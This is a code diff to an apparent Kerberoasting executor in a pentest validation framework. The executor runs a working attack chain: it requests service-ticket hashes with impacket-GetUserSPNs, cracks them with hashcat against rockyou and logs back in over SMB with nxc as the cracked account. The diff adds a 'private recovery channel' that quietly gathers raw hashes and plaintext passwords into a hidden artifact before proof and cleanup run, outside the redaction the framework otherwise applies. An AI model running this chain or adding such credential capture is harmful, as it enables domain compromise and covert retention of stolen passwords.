@@ -33,7 +33,7 @@ from typing import Any, Optional
 from ..recommend import ParamSpec, ParamValue, values
 from .. import proof
 from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
-                   redact_argv, ToolAttempt, first_successful)
+                   redact_argv, ToolAttempt, first_successful, SecretReveal)
 
 
 # Default Kali wordlist (claude-mem #66146 cracked against rockyou).
@@ -161,6 +161,14 @@ class _RoastExecutor(ValidationExecutor):
         out_dir.mkdir(parents=True, exist_ok=True)
         op_target, op_extra = self._op_auth_target(cfg)
 
+        # Private recovery channel, populated before any downstream proof/cleanup.
+        artifact = {"_reveal": []}
+        ctx._pending_reveal_artifact = artifact
+
+        def finish(*args):
+            artifact.update(self._artifact(*args))
+            return artifact
+
         steps: list[StepRecord] = []
         errors: list[str] = []
         gate = {"classifier": "not_required", "op": None}
@@ -189,12 +197,16 @@ class _RoastExecutor(ValidationExecutor):
         att, res, _roast_won = first_successful(ctx.runner, attempts,
                                                 timeout=cfg.tool_timeout_s)
         hashes = self.hash_re.findall(res.stdout or "")
+        if self.technique == "KERBEROAST":
+            artifact["_reveal"].extend(
+                SecretReveal(self.technique, "crackable_hash", principal, blob)
+                for blob in hashes)
         roast_ok = bool(hashes)
         record("roast", att.argv, res, roast_ok,
                note=(f"via {att.tool}; {len(hashes)} hash(es)" if roast_ok else "no hash"))
         if not roast_ok:
             errors.append("roast_no_hash")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish(steps, gate, mutation, None, False, errors)
         hashfile = out_dir / f"{self.technique_class}_{principal}.hash"
         hashfile.write_text("\n".join(hashes) + "\n", encoding="utf-8")
 
@@ -205,7 +217,7 @@ class _RoastExecutor(ValidationExecutor):
             gate["classifier"] = "denied"
             gate["op"] = "offline_crack"
             errors.append("gate_denied:offline_crack")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish(steps, gate, mutation, None, False, errors)
         if verdict == "approved":
             gate["classifier"] = "approved"
             gate["op"] = "offline_crack"
@@ -219,12 +231,15 @@ class _RoastExecutor(ValidationExecutor):
                      "--potfile-path", str(potfile), "--outfile-format", "2", "--quiet"]
         res_show = ctx.runner.run(show_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
         plaintext = self._first_plaintext(res_show.stdout or "")
+        if plaintext and self.technique == "KERBEROAST":
+            artifact["_reveal"].append(SecretReveal(
+                self.technique, "password", principal, plaintext))
         crack_ok = bool(plaintext)
         record("crack", crack_argv, res, crack_ok,
                note="cracked" if crack_ok else "not cracked")
         if not crack_ok:
             errors.append("crack_failed")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish(steps, gate, mutation, None, False, errors)
 
         # 3) re-authenticate as the cracked principal = the terminal proof --
         nxc_argv = ["nxc", "smb", reauth_target, "-u", principal, "-p", plaintext]
@@ -244,7 +259,7 @@ class _RoastExecutor(ValidationExecutor):
                                           "pwn3d" if _RE_NXC_PWNED.search(out) else "auth"),
         )
         complete = reauth_ok
-        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
+        return finish(steps, gate, mutation, terminal_fact, complete, errors)
 
     # ---------------------------------------------------------------- helpers
     @staticmethod
@@ -271,6 +286,9 @@ class KerberoastExecutor(_RoastExecutor):
     _hash_name = "$krb5tgs$"
     recipe_ref = ("#66146 KERBEROAST = impacket-GetUserSPNs -request -> $krb5tgs$ "
                   "-> hashcat -m 13100 rockyou -> reauth nxc smb (PROVED jon.snow)")
+
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
 
     def _roast_argv(self, ctx, principal, op_target, op_extra) -> list[str]:
         argv = ["impacket-GetUserSPNs", op_target, "-dc-ip", ctx.config.dc_ip,
